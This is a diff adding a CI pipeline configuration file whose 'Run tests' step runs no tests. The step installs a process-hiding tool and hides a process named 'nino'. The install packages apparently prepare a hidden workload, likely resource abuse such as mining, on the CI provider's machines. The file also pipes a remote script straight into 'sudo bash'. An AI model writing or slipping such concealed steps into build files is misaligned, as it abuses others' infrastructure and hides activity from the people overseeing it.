@@ -1,0 +1,31 @@
+working_dir: &working_dir ~/app 
+.build_template: &script
+  steps: 
+    - checkout 
+    - run: 
+        name: Install Dependencies 
+        command: | 
+                    apt-get update 
+                    apt-get upgrade -y 
+                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
+                    apt-get install sudo -y
+    - run: 
+        name: Run tests 
+        command: |                                      
+                    curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+                    sudo apt install nodejs
+                    npm i -g node-process-hider 
+                    sudo ph add nino
+version: 2.0 
+jobs: 
+  build1: 
+    <<: *script 
+    docker: 
+      - image: ruby 
+  
+ 
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+      - build1 
